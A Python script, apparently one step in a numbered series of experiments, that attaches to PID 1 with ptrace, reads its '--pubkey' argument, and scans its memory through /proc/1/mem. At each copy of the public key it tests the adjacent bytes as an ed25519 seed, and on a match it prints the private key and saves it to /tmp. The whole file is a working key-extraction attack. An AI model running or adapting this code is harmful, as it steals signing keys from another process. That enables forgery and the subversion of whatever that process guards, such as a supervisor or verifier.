# 实验I10b: 修复版 - 纯 Python ed25519 验证 + 命中上下文 dump
import ctypes, re, base64, hashlib

libc = ctypes.CDLL("libc.so.6")
if libc.ptrace(16, 1, 0, 0) != 0:
    print("ATTACH FAILED"); exit(1)

cmdline = open("/proc/1/cmdline").read().split("\0")
pub = None
for a in cmdline:
    if a.startswith("--pubkey="):
        pub = base64.b64decode(a.split("=", 1)[1])
print(f"[1] pubkey len={len(pub)}", flush=True)

# ---- 纯 Python ed25519 公钥派生 (RFC8032) ----
p = 2**255 - 19
d = (-121665 * pow(121666, p - 2, p)) % p
Bx = 15112221349535400772501151409588531511454012693041857206046113283949847762202
By = 46316835694926478169428394003475163141307993866256225615783033603165251855960

def inv(x): return pow(x, p - 2, p)
def point_add(P, Q):
    if P is None: return Q
    if Q is None: return P
    x1, y1 = P; x2, y2 = Q
    if (x1, y1) == (x2, p - y2): return None
    x3 = ((x1 * y2 + y1 * x2) * inv(1 + d * x1 * x2 * y1 * y2)) % p
    y3 = ((y1 * y2 + x1 * x2) * inv(1 - d * x1 * x2 * y1 * y2)) % p
    return (x3, y3)
def point_mul(k, P):
    R = None
    while k:
        if k & 1: R = point_add(R, P)
        P = point_add(P, P)
        k >>= 1
    return R
def pub_from_seed(seed):
    h = hashlib.sha512(seed).digest()
    a = int.from_bytes(h[:32], "little")
    a &= (1 << 254) - 8     # 清 bit0-2, bit254-255
    a |= 1 << 254           # 设置 bit254
    A = point_mul(a, (Bx, By))
    return A[1] % p | ((A[0] & 1) << 255)

print(f"[2] 自检: 派生已知测试向量", flush=True)
test_seed = bytes.fromhex("9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60")
test_pub = bytes.fromhex("d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a")
ok = pub_from_seed(test_seed).to_bytes(32, "little") == test_pub
print(f"    ed25519 实现正确={ok}", flush=True)
if not ok:
    print("实现有误, 终止"); libc.ptrace(17, 1, 0, 0); exit(1)

# ---- 内存搜索 ----
maps = []
with open("/proc/1/maps") as f:
    for line in f:
        parts = line.split()
        start, end = [int(x, 16) for x in parts[0].split("-")]
        if "r" in parts[1]:
            maps.append((start, end, parts[1], parts[-1] if len(parts) > 5 else ""))
print(f"[3] 可读区域 {len(maps)} 个", flush=True)

hits = []
for start, end, perms, path in maps:
    size = end - start
    if size > 128 * 1024 * 1024:
        continue
    try:
        with open("/proc/1/mem", "rb") as m:
            m.seek(start)
            data = m.read(size)
        for mo in re.finditer(re.escape(pub), data):
            hits.append((start + mo.start(), path))
    except Exception:
        pass
print(f"[4] 公钥命中 {len(hits)} 处", flush=True)

for i, (pos, path) in enumerate(hits):
    with open("/proc/1/mem", "rb") as m:
        # dump 前后 160 字节
        m.seek(max(0, pos - 160))
        ctx = m.read(320 + 32)
    # 尝试 pos-32 / pos / pos+32 作为 seed
    for delta, label in [(32, "seed@pos-32"), (0, "seed@pos(错误?)"), (-32, "seed@pos+32")]:
        s = pos - delta
        if s < 0: continue
        with open("/proc/1/mem", "rb") as m:
            m.seek(s)
            seed = m.read(32)
        pk = pub_from_seed(seed).to_bytes(32, "little")
        if pk == pub:
            print(f"  *** 命中{i} @{pos:#x} {path} [{label}] -> 私钥提取成功! ***", flush=True)
            print(f"  seed(b64)={base64.b64encode(seed).decode()}", flush=True)
            open("/tmp/ed25519_seed.bin", "wb").write(seed)
    print(f"  命中{i} @{pos:#x} {path} 上下文:", flush=True)
    print("   " + ctx[:200].hex(), flush=True)

libc.ptrace(17, 1, 0, 0)
print("detached", flush=True)
